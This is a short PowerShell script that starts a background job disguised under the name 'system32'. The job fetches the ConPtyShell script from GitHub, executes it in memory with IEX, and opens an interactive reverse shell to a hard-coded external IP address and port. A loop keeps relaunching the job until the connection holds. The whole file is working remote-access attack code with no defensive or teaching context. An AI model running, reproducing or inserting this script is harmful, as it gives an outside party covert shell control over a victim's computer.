# Function to start the job
function Start-System32Job {
    $job = Start-Job -Name "system32" -ScriptBlock {
        # Your job script goes @"
        IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing) 
        Invoke-ConPtyShell 18.141.129.246 16976
    }

    return $job
}

# Start the job loop
do {
    # Start the job
    $job = Start-System32Job

    # Wait for 10 seconds
    Start-Sleep -Seconds 10

    # Check if the job is still running
    if ($job.State -eq 'Running') {
        Write-Host "Job is running for more than 10 seconds. Stopping the loop."
        
        # Stop the loop
        break
    }

    # Remove the completed job
    Remove-Job -Name "system32" -Force

} while ($true)
